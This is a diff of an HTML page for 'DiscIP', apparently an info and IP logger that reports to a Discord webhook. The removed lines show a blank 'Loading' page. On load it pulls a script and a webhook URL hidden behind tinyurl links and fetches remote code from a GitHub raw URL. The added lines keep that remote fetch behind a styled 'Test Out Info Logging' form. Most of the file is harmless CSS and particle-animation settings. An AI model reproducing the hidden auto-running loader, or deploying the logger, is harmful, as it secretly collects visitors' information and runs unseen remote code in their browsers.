@@ -1,11 +1,379 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading</title>
-    <script src="https://tinyurl.com/3yhdxb4p"></script>
+    <title>DiscIP Website</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            user-select: none; /* Prevent text/images from being selectable */
+        }
+
+        #gradient-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            background: linear-gradient(to bottom right, #9933ff, #7289da);
+            opacity: 0.8;
+        }
+
+        #particles-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none; /* Disable interaction with particles */
+        }
+
+        #container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            opacity: 0;
+            animation: fade-in 2s ease-in-out forwards;
+            z-index: 1;
+            user-select: none; /* Prevent text from being selectable */
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            transform-origin: bottom center;
+        }
+
+        #container:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, #9933ff, #aa55ff, #bb77ff, #cc99ff, #ddbbff, #cc99ff, #bb77ff, #aa55ff);
+            background-size: 800% 100%;
+            animation: pulsate 5s ease-in-out infinite;
+        }
+
+        @keyframes pulsate {
+            0% {
+                background-position: 0% 0%;
+            }
+            10% {
+                background-position: 40% 0%;
+            }
+            20% {
+                background-position: 50% 0%;
+            }
+            30% {
+                background-position: 60% 0%;
+            }
+            40% {
+                background-position: 70% 0%;
+            }
+            50% {
+                background-position: 80% 0%;
+            }
+            60% {
+                background-position: 90% 0%;
+            }
+            70% {
+                background-position: 100% 0%;
+            }
+            80% {
+                background-position: 80% 0%;
+            }
+            90% {
+                background-position: 60% 0%;
+            }
+            100% {
+                background-position: 0% 0%;
+            }
+        }
+
+        #logo {
+            width: 50px;
+            margin-right: 10px;
+            opacity: 0;
+            animation: fade-in 2s ease-in-out forwards;
+            pointer-events: none; /* Disable interaction with logo */
+        }
+
+        h1 {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 700;
+            font-size: 24px;
+            user-select: none; /* Prevent text from being selectable */
+        }
+
+        @keyframes fade-in {
+            0% {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        #plus-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #7289da;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+            z-index: 2;
+        }
+
+        #plus-button:hover {
+            background-color: #9933ff;
+        }
+
+        #plus-button.active {
+            background-color: #ff4136;
+        }
+
+        #plus-button:before,
+        #plus-button:after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 3px;
+            background-color: white;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        #plus-button:before {
+            transform: rotate(45deg);
+        }
+
+        #plus-button:after {
+            transform: rotate(-45deg);
+        }
+
+        #plus-button.active:before,
+        #plus-button.active:after {
+            transform: rotate(0);
+        }
+
+        #overlay-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 400px;
+            max-width: 80%;
+            height: 200px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+        }
+
+        #overlay-container.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        #overlay-container h2 {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 700;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        #overlay-container p {
+            color: white;
+            font-family: 'Nunito', sans-serif;
+            font-weight: 400;
+            font-size: 14px;
+        }
+
+        #overlay-container input {
+            width: 100%;
+            height: 30px;
+            margin-bottom: 10px;
+            padding: 5px;
+            border-radius: 5px;
+            border: none;
+        }
+
+        #overlay-container button {
+            padding: 5px 10px;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease-in-out;
+        }
+
+        #overlay-container button:hover {
+            background-color: #9933ff;
+        }
+    </style>
+</head>
+<body>
+    <div id="gradient-background"></div>
+    <div id="particles-container"></div>
+    <div id="container">
+        <img id="logo" src="https://tinypic.host/images/2023/07/18/imagebe53bf784cc7a1a7.png" alt="DiscIP Logo">
+        <h1>DiscIP</h1>
+    </div>
+    <div id="plus-button"></div>
+    <div id="overlay-container">
+        <h2>Test Out Info Logging</h2>
+        <p>Make sure this is your webhook and your info is safe. Your information will be sent through the entered webhook.</p>
+        <input type="text" id="webhook-input" placeholder="Enter Webhook URL">
+        <button id="send-button">Send</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
-        function load() {
-            var webhookURL = 'https://tinyurl.com/2fscbttt';
+        window.addEventListener('DOMContentLoaded', function() {
+            var container = document.getElementById('container');
+            var logo = document.getElementById('logo');
+            container.style.opacity = '1';
+            logo.style.opacity = '1';
+        });
+
+        particlesJS('particles-container', {
+            particles: {
+                number: {
+                    value: 80,
+                    density: {
+                        enable: true,
+                        value_area: 800
+                    }
+                },
+                color: {
+                    value: '#9933ff' // Bright purple color
+                },
+                shape: {
+                    type: 'circle',
+                    stroke: {
+                        width: 0,
+                        color: '#000000'
+                    }
+                },
+                opacity: {
+                    value: 0.8,
+                    random: false,
+                    anim: {
+                        enable: false,
+                        speed: 1,
+                        opacity_min: 0.1,
+                        sync: false
+                    }
+                },
+                size: {
+                    value: 30,
+                    random: true,
+                    anim: {
+                        enable: false,
+                        speed: 40,
+                        size_min: 0.1,
+                        sync: false
+                    }
+                },
+                line_linked: {
+                    enable: false,
+                    distance: 150,
+                    color: '#ffffff',
+                    opacity: 0.4,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 6,
+                    direction: 'none',
+                    random: false,
+                    straight: false,
+                    out_mode: 'out',
+                    bounce: false,
+                    attract: {
+                        enable: false,
+                        rotateX: 600,
+                        rotateY: 1200
+                    }
+                }
+            },
+            interactivity: {
+                detect_on: 'canvas',
+                events: {
+                    onhover: {
+                        enable: false
+                    },
+                    onclick: {
+                        enable: false
+                    },
+                    resize: true
+                },
+                modes: {
+                    grab: {
+                        distance: 400,
+                        line_linked: {
+                            opacity: 1
+                        }
+                    },
+                    bubble: {
+                        distance: 400,
+                        size: 40,
+                        duration: 2,
+                        opacity: 8,
+                        speed: 3
+                    },
+                    repulse: {
+                        distance: 200,
+                        duration: 0.4
+                    },
+                    push: {
+                        particles_nb: 4
+                    },
+                    remove: {
+                        particles_nb: 2
+                    }
+                }
+            },
+            retina_detect: true
+        });
+
+        var plusButton = document.getElementById('plus-button');
+        var overlayContainer = document.getElementById('overlay-container');
+        var webhookInput = document.getElementById('webhook-input');
+        var sendButton = document.getElementById('send-button');
+
+        plusButton.addEventListener('click', function() {
+            plusButton.classList.toggle('active');
+            overlayContainer.classList.toggle('active');
+        });
+
+        sendButton.addEventListener('click', function() {
+            var webhookURL = webhookInput.value;
 
             var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';
 
@@ -19,9 +387,7 @@
                 }
             };
             xhr.send();
-        }
+        });
     </script>
-</head>
-<body onload="load()">
 </body>
 </html>
